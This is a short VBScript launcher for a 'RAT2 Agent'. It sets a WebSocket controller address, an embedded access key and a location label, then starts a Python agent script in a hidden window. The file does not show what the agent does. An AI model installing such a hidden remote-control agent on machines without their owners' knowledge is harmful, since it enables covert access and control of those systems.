' RAT2 Agent - silent launcher
' Edit the three lines below for each machine, then double-click this file.
Dim RAT2_URL      : RAT2_URL      = "ws://YOUR-MANAGER-IP:8080/ws/agent"
Dim RAT2_KEY      : RAT2_KEY      = "Zu6_4hEGklhBBQzHYjj1-0n2hbvr-6cuu4huzkufhZQ"
Dim RAT2_LOCATION : RAT2_LOCATION = "This PC"
' -----------------------------------------------------------------------

Dim sh  : Set sh  = CreateObject("WScript.Shell")
Dim fso : Set fso = CreateObject("Scripting.FileSystemObject")
Dim dir : dir = fso.GetParentFolderName(WScript.ScriptFullName)
sh.CurrentDirectory = dir

sh.Environment("Process")("RAT2_URL")      = RAT2_URL
sh.Environment("Process")("RAT2_KEY")      = RAT2_KEY
sh.Environment("Process")("RAT2_LOCATION") = RAT2_LOCATION

' 0 = hidden window, False = don't wait
sh.Run "python rat2.py agent", 0, False
